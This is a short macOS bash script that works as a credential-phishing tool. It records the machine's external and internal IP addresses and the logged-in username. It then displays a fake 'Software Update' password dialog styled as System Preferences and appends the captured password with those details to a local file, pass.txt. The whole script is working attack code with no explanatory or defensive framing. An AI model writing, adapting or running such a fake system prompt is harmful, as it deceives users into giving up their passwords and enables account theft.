#!/usr/bin/env bash

externalip=$(curl -s http://ipecho.net/plain)
internalip=$(ifconfig en0 | grep inet | awk '$1=="inet" {print $2}')
username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /loginwindow/ { print $3 }')
fullname=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/RealName :/ && ! /loginwindow/ { print $3 }')


read -r -d '' applescriptCode <<'EOF'
set msg1 to "Software Update is trying to authenticate user.

Enter the password for the user "
set username to long user name of (system info)
set msg2 to " to allow this."
set dialogText to text returned of (display dialog "" & msg1 & username & msg2 with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns" with title "System Preferences" default answer "" with hidden answer)
return dialogText
EOF

dialogText=$(osascript -e "$applescriptCode");
echo $externalip + $internalip + username=$username  password=$dialogText >>  pass.txt;

#sleep 1
#dialogText=$(osascript -e "$applescriptCode");

#echo $externalip + $internalip + username=$username  password=$dialogText >>  pass.txt;

#sleep 1
#dialogText=$(osascript -e "$applescriptCode");

#echo $externalip + $internalip + username=$username  password=$dialogText >>  pass.txt;

